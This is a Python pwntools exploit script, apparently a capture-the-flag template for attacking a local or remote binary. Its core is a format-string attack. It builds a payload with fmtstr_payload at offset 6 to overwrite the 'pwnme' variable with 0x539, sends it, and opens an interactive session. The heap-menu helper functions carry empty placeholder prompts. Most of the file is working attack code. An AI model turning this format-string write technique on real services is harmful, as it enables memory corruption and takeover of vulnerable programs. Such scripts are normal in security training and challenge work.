#! /usr/bin/python
from pwn import *
# log_level = "debug"
context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["xfce4-terminal", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = ""
PORT = 1234

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT)
    else:
        return process(binary)

def create(p, size, value):
    sl(p, b"")
    sla(p, b"", b"%i" % size)
    sla(p, b"", value)
    ru(p, b"")

def edit(p, index, value):
    sl(p,b"")
    sla(p, b"", "%i" % index)
    sla(p, b"", value)
    ru(p,b"")

def delete(p, index):
    sl(p,b"")
    sla(p, b"", "%i" % index)
    ru(p, b"")

def view(p, index):
    sl(p,b"")
    sla(p, b"", "%i" % index)
    
    ru(p,b"")
    ret = rl(p)
    ru(p, b"")
    
    return ret

def exploit(io,e):
    print(e.sym.pwnme)
    payload = fmtstr_payload(6, {e.sym.pwnme: 0x539}, write_size="int")
    print(payload)

    sla(io, b">>>", payload) 

    io.interactive()
    

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    #l = ELF("./libc.so.6")

    exploit(p,e)
